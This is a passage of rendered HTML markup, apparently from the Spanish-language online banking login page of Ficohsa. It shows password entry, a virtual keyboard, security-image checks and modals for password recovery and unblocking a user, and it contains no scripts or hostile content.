<i _ngcontent-c32="" class="stream-arrow_back_1"></i>
<div _ngcontent-c32="" class="ipswich-header-background">
</div>
</a>
<span _ngcontent-c32="" class="ipswich-main-title-pipe"></span>
</div>
<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Comprobación de identidad
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-password _ngcontent-c29="" _nghost-c34="">
<form _ngcontent-c34="" autocomplete="off" novalidate="" class="wizardAutoHeightMode ng-untouched ng-pristine ng-invalid">
<div _ngcontent-c34="" class="ipswich-main-data">
<i _ngcontent-c34="" class="stream-Icon_login_password_3"></i>
<input _ngcontent-c34="" autocomplete="off" class="ipswich-main-data-input required ng-untouched ng-pristine ng-invalid" formcontrolname="password" id="step02" type="password" placeholder="Ingrese su contraseña">

</div>
<div _ngcontent-c34="" class="ipswich-main-keyboard">
<a _ngcontent-c34="" class="ipswich-main-keyboard-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
Teclado virtual</a>
</div>
<icb-virtual-keyboard _ngcontent-c34="" _nghost-c45="">

<div _ngcontent-c45="" class="virtual-keyboard">
<icb-contextual-panel _ngcontent-c45="" height="Default" pointerlocation="topCenter" usemode="contextualPanel" width="330" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode     no_header no_footer fullscreen visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator">
</div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="true">
<a _ngcontent-c14="" class="manchester-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c14="" class="svg-remove-circle">
<circle _ngcontent-c14="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c14="" x1="14" x2="6" y1="6" y2="14">
</line>
<line _ngcontent-c14="" x1="6" x2="14" y1="6" y2="14">
</line>
</svg>
</a>
<h6 _ngcontent-c14=""></h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle">

<main-content _ngcontent-c45="" style="display: block">
<div _ngcontent-c45="" class="keyboard-image-container">
<img _ngcontent-c45="" class="keyboard-lowerCase" usemap="#Map" src="https://secure.ficohsa.com/Resources/images/keyboardLowerCaseLowContrast.png" style="margin-top: 6px; margin-left: -8px;">

</div>
<div _ngcontent-c45="" class="keyboard-checkbox-container">
<input _ngcontent-c45="" name="color" type="radio" value="0" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><label _ngcontent-c45="" class="keyboard-contrast" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">bajo
contraste</label>
<input _ngcontent-c45="" name="color" type="radio" value="1" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><label _ngcontent-c45="" class="keyboard-contrast" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">alto
contraste</label>
</div>
</main-content>


</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
</div>
</div>
</div>
</div>
</icb-contextual-panel>
</div>
</icb-virtual-keyboard>
<div _ngcontent-c34="" class="clearboth"></div>
<div _ngcontent-c34="" class="ipswich-main-validation">


<div _ngcontent-c34="" class="ipswich-main-validation-image-preview">
<icb-loader _ngcontent-c34="" _nghost-c9="">
<div _ngcontent-c9="" class="jyvaskyla  ">


<div _ngcontent-c9="" class="jyvaskyla-balls">
<div _ngcontent-c9=""></div>
<div _ngcontent-c9=""></div>
<div _ngcontent-c9=""></div>
</div>

</div>
</icb-loader>
</div>
<div _ngcontent-c34="" class="ipswich-main-validation-description">
Asegúrese que esta es la imagen seleccionada por
Ud
<icb-contextual-info _ngcontent-c34="" height="180" icon="stream-help-circle" pointerlocation="topRight" theme="dark" usemode="contextualPanel" width="320" _nghost-c28="">
<span _ngcontent-c28="" class="tokyo_icon helpLoginStepPasswordMode">
<i _ngcontent-c28="" id="contextualInfoLocalIcon" class="stream-help-circle" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
<div _ngcontent-c28="" class="belek-background"></div>
</span>
<icb-contextual-panel _ngcontent-c28="" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode helpLoginStepPasswordMode dark   no_header no_footer  visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator">
</div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="true">

<h6 _ngcontent-c14="">
<header _ngcontent-c28="" class="tokyo_header dark">
</header>
</h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle">

<main-content _ngcontent-c28="">


<div _ngcontent-c28="" class="tokyo_content dark">
<content _ngcontent-c34="">
<span _ngcontent-c34="" class="ipswich-main-message-help">Si
es tu
primer
registro,
ésta es
una
imagen
temporal
que
cambiarás
cuando
termines
este
proceso.
Caso
contrario
llamanos
al 2280
1000</span>
</content>
</div>

</main-content>


</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
 </div>
</div>
</div>
</div>
</icb-contextual-panel>
</icb-contextual-info>
</div>
</div>
<div _ngcontent-c34="" class="clearboth"></div>
<div _ngcontent-c34="" class="ipswich-main-buttons-login-password fr">
<icb-button _ngcontent-c34="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple big" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
<icb-button _ngcontent-c34="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive big" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Siguiente
</span>
</a>
</icb-button>
</div>
<div _ngcontent-c34="" class="clearboth"></div>
<div _ngcontent-c34="" class="ipswich-main-engagement-password">
<div _ngcontent-c34="" class="ipswich-main-engagement-data fr">
<ul _ngcontent-c34="" class="ipswich-main-engagement-data-ul">

<li _ngcontent-c34="" class="ipswich-main-engagement-data-ul-item">
<a _ngcontent-c34="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
¿Ha olvidado su contraseña?
</a>
</li>

<li _ngcontent-c34="" class="ipswich-main-engagement-data-ul-item-pipe">
|</li>

<li _ngcontent-c34="" class="ipswich-main-engagement-data-ul-item">
<a _ngcontent-c34="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
¿Su usuario ha sido bloqueado?
</a>
</li>
</ul>
</div>
</div>

</form>
<icb-unblock-user-online _ngcontent-c34="" _nghost-c48="">
<icb-modalpopup _ngcontent-c48="" canceltext="administration.general.unblockuseronline.buttons.cancelButtonText" confirmtext="administration.general.unblockuseronline.buttons.confirmButtonText" displaymode="unlockUserOnlineMode" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode unlockUserOnlineMode basic" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">
<a _ngcontent-c5="" class="parma-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c5="" class="svg-remove-circle">
<circle _ngcontent-c5="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c5="" x1="14" x2="6" y1="6" y2="14">
</line>
<line _ngcontent-c5="" x1="6" x2="14" y1="6" y2="14">
</line>
</svg>
</a>
<span _ngcontent-c5="" class="parma-content-header-text ">¿Su
usuario ha sido bloqueado?</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle unlockUserOnlineMode" style="height: auto;">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c48="">
<div _ngcontent-c48="" class="main-container-login-utils">
<icb-form _ngcontent-c48="" displaymode="userBlockMode" helpstyle="tooltip" _nghost-c15="">
<form _ngcontent-c15="" autocapitalice="off" autocomplete="off" novalidate="" class="break-0 userBlockMode ng-untouched ng-pristine ng-valid">
<div _ngcontent-c15="" class="venecia-form">

<div _ngcontent-c15="" class="venecia-main-form-required">
<span _ngcontent-c15="" class="venecia-main-form-required-text">Obligatorio</span>
</div>
<icb-record-render _ngcontent-c15="" _nghost-c17="">



<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">






<icb-textbox _ngcontent-c18="" type="email" _nghost-c22="">
 


<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Ingrese
su
e-mail

<icb-contextual-info _ngcontent-c22="" displaymode="textHelpMode" height="80" icon="stream-help-circle" pointerlocation="topCenter" theme="dark" usemode="contextualPanel" width="210" _nghost-c28="">
<span _ngcontent-c28="" class="tokyo_icon textHelpMode">
<i _ngcontent-c28="" id="contextualInfoLocalIcon" class="stream-help-circle" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
<div _ngcontent-c28="" class="belek-background">
</div>
</span>
<icb-contextual-panel _ngcontent-c28="" _nghost-c14="">
 <div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode textHelpMode dark   no_header no_footer  visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator">
</div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="true">

<h6 _ngcontent-c14="">
<header _ngcontent-c28="" class="tokyo_header dark">
</header>
</h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle">

<main-content _ngcontent-c28="">


<div _ngcontent-c28="" class="tokyo_content dark">
<content _ngcontent-c22="">
<span _ngcontent-c22="" class="venecia-main-form-label-contextual-description">Para
verificar
su
identidad
ingrese
la
misma
dirección
de
e-mail
que
tiene
asociada
su
usuario</span>
</content>
</div>

</main-content>


</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
</div>
</div>
</div>
</div>
</icb-contextual-panel>
</icb-contextual-info>
</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="email" placeholder="usuario@mail.com" maxlength="80" tabindex="0" title="usuario@mail.com" autocomplete="off" name="email" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>












</div>
</div>
</div>
 </icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">
 









<icb-textbox _ngcontent-c18="" type="password" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Respuesta
a
pregunta
secreta

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="password" placeholder="" maxlength="80" tabindex="0" title="" autocomplete="off" name="secretAnswer" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">


<div _ngcontent-c22="" class="venecia-password">
<i _ngcontent-c22="" class="stream-password_hide" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
</div>


</div>
</div>
</icb-textbox>








</div>
</div>
</div>
</icb-field-render>
</div>
</icb-record-render>
</div>
</form>
</icb-form>
<div _ngcontent-c48="">
<span _ngcontent-c48="" class="ipswich-main-footer-description ipswich-main-footer-description-label">
<div _ngcontent-c48="">
Pregunta secreta
</div>
</span>
<span _ngcontent-c48="" class="ipswich-main-footer-description">
<a _ngcontent-c48="" class="login-utils-link-message" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
Mostrar pregunta
secreta
</a>

</span>
</div>
<div _ngcontent-c48="">


</div>
</div>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link unlockUserOnlineMode inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>


<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple unlockUserOnlineMode" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
</div>
</div>
</div>
</icb-modalpopup>
</icb-unblock-user-online>
<icb-forgot-password _ngcontent-c34="" _nghost-c47="">
<icb-modalpopup _ngcontent-c47="" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode forgotPasswordMode basic" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">
<a _ngcontent-c5="" class="parma-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c5="" class="svg-remove-circle">
<circle _ngcontent-c5="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c5="" x1="14" x2="6" y1="6" y2="14">
</line>
<line _ngcontent-c5="" x1="6" x2="14" y1="6" y2="14">
</line>
</svg>
</a>
<span _ngcontent-c5="" class="parma-content-header-text ">¿Ha
olvidado su contraseña?</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle forgotPasswordMode" style="height: auto;">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c47="">
<div _ngcontent-c47="" class="main-container-login-utils">
<icb-form _ngcontent-c47="" _nghost-c15="">
<form _ngcontent-c15="" autocapitalice="off" autocomplete="off" novalidate="" class="break-0 userBlockMode ng-untouched ng-pristine ng-valid">
<div _ngcontent-c15="" class="venecia-form">

<div _ngcontent-c15="" class="venecia-main-form-required">
<span _ngcontent-c15="" class="venecia-main-form-required-text">Obligatorio</span>
</div>
<icb-record-render _ngcontent-c15="" _nghost-c17="">



<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">






  <icb-textbox _ngcontent-c18="" type="email" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Ingrese
su
e-mail

<icb-contextual-info _ngcontent-c22="" displaymode="textHelpMode" height="80" icon="stream-help-circle" pointerlocation="topCenter" theme="dark" usemode="contextualPanel" width="210" _nghost-c28="">
<span _ngcontent-c28="" class="tokyo_icon textHelpMode">
<i _ngcontent-c28="" id="contextualInfoLocalIcon" class="stream-help-circle" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
<div _ngcontent-c28="" class="belek-background">
</div>
 </span>
<icb-contextual-panel _ngcontent-c28="" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode textHelpMode dark   no_header no_footer  visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator">
</div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="true">

<h6 _ngcontent-c14="">
<header _ngcontent-c28="" class="tokyo_header dark">
</header>
</h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle">

<main-content _ngcontent-c28="">


<div _ngcontent-c28="" class="tokyo_content dark">
<content _ngcontent-c22="">
<span _ngcontent-c22="" class="venecia-main-form-label-contextual-description">Para
verificar
su
identidad
ingrese
la
misma
dirección
de
e-mail
que
tiene
asociada
su
usuario</span>
</content>
</div>

</main-content>


</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
</div>
</div>
</div>
</div>
</icb-contextual-panel>
</icb-contextual-info>
</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="email" placeholder="usuario@mail.com" maxlength="80" tabindex="0" title="usuario@mail.com" autocomplete="off" name="email" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>












</div>
</div>
</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">










<icb-textbox _ngcontent-c18="" type="password" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">

<span _ngcontent-c22="" class="venecia-main-form-label">
Respuesta
a
pregunta
secreta

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="password" placeholder="" maxlength="80" tabindex="0" title="" autocomplete="off" name="secretAnswer" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">


<div _ngcontent-c22="" class="venecia-password">
<i _ngcontent-c22="" class="stream-password_hide" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
 </div>


</div>
</div>
</icb-textbox>






 

</div>
</div>
</div>
</icb-field-render>
</div>
</icb-record-render>
</div>
 </form>
</icb-form>
<div _ngcontent-c47="">
<span _ngcontent-c47="" class="ipswich-main-footer-description ipswich-main-footer-description-label">
<div _ngcontent-c47="">
Pregunta secreta
</div>
</span>
<span _ngcontent-c47="" class="ipswich-main-footer-description">
<a _ngcontent-c47="" class="login-utils-link-message" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
Mostrar pregunta
secreta
</a>

</span>
</div>
<div _ngcontent-c47="">


</div>
</div>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link forgotPasswordMode inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>


<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple forgotPasswordMode" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
</div>
</div>
</div>
</icb-modalpopup>
</icb-forgot-password>
</icb-login-step-password>
</wizard-step-content>
</div>



</div>
</icb-wizard-step-one-by-one>
<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl wizardAutoHeightMode">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-multifactor-device _ngcontent-c29="" _nghost-c35="">




<div _ngcontent-c35="" class="ipswich-main-buttons-login-multifactor fr wizardAutoHeightMode">
<icb-button _ngcontent-c35="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple big" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
<icb-button _ngcontent-c35="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive big" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>
</div>
<div _ngcontent-c35="" class="clearboth"></div>
</icb-login-step-multifactor-device>
</wizard-step-content>
</div>



</div>
</icb-wizard-step-one-by-one>
</div>
</div>

</icb-wizard>
<icb-wizard _ngcontent-c29="" _nghost-c31="" data-hidden="true">

<div _ngcontent-c31="" class="ipswich-main fl wizardAutoHeightMode with-advertising">
<div _ngcontent-c31="" class="ipswich-main-animate">

<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl wizardAutoHeightMode scrollContent header-changePasswordMode ipswich-step-visible">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Ingrese una nueva contraseña
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-change-password _ngcontent-c29="" _nghost-c36="">
<div _ngcontent-c36="" class="main-container">

</div>
</icb-login-step-change-password>
</wizard-step-content>
</div>



</div>
</icb-wizard-step-one-by-one>
<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl wizardAutoHeightMode">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Contraseña
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header real-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
<wizard-step-title _ngcontent-c29="">
<div _ngcontent-c29="" class="ipswich-main-firm-data">
Seleccione una imagen
</div>
</wizard-step-title>
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-security-image-selection _ngcontent-c29="" _nghost-c37="">
<icb-dynamic-loader _ngcontent-c37="" module="Authentication.Components.SecurityImageSelection" moduleurlsegment="___securityimageselection">
<div></div>
</icb-dynamic-loader>
<icb-security-image-selection _nghost-c53="">
<div _ngcontent-c53="" class="grid-container">
<div _ngcontent-c53="" class="grid">

</div>

</div>
</icb-security-image-selection>
</icb-login-step-security-image-selection>
</wizard-step-content>
</div>


<div _ngcontent-c32="" class="ipswich-main-wizard-footer ">


<div _ngcontent-c32="" class="ipswich-main-additional-buttons fr">
<wizard-step-additional-buttons _ngcontent-c29="">
<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>
</wizard-step-additional-buttons>
</div>
</div>

</div>
</icb-wizard-step-one-by-one>
<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl wizardAutoHeightMode">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Contraseña
</wizard-title>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header real-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
<wizard-step-title _ngcontent-c29="">
<div _ngcontent-c29="" class="ipswich-main-firm-data">
Complete información de seguridad
</div>
</wizard-step-title>
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-complete-user-data _ngcontent-c29="" _nghost-c38="">
<form _ngcontent-c38="" novalidate="" class="main-container-login-utils wizardAutoHeightMode ng-untouched ng-pristine ng-valid">






</form>
</icb-login-step-complete-user-data>
</wizard-step-content>
</div>


<div _ngcontent-c32="" class="ipswich-main-wizard-footer ">


<div _ngcontent-c32="" class="ipswich-main-additional-buttons fr">
<wizard-step-additional-buttons _ngcontent-c29="">
<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>

<icb-button _ngcontent-c29="" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>
